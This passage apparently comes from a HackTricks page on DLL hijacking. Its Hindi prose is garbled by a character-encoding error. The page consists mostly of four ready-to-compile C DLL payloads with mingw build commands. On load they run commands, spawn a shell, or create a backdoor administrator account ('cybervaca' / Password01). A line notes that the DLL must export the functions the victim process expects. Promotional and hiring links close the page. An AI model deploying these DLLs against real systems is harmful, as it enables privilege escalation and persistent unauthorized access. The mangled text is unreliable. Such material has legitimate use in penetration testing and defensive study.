рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдХрд▓рд┐рдд Dll рдХреЛ **рдХрдИ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдирд┐рд░реНрдпрд╛рдд рдХрд░рдиреЗ рдЪрд╛рд╣рд┐рдП** рдЬреЛ рдкреАрдбрд╝рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╣реИрдВ, рдпрджрд┐ рдпреЗ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИрдВ рддреЛ **рдмрд╛рдЗрдирд░реА рдЙрдиреНрд╣реЗрдВ рд▓реЛрдб рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдЧреА** рдФрд░ **exploit рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рдПрдЧрд╛**ред
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

рдпрджрд┐ рдЖрдк **рд╣реИрдХрд┐рдВрдЧ рдХрд░рд┐рдпрд░** рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рдФрд░ рдЕрднреЗрджреНрдп рдХреЛ рд╣реИрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ - **рд╣рдо рднрд░реНрддреА рдХрд░ рд░рд╣реЗ рд╣реИрдВ!** (_рдзрд╛рд░рд╛рдкреНрд░рд╡рд╛рд╣ рдкреЛрд▓рд┐рд╢ рд▓рд┐рдЦрд┐рдд рдФрд░ рдмреЛрд▓реА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдЖрд╡рд╢реНрдпрдХ_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ.**
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рддрд░рдХреАрдмреЗрдВ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>
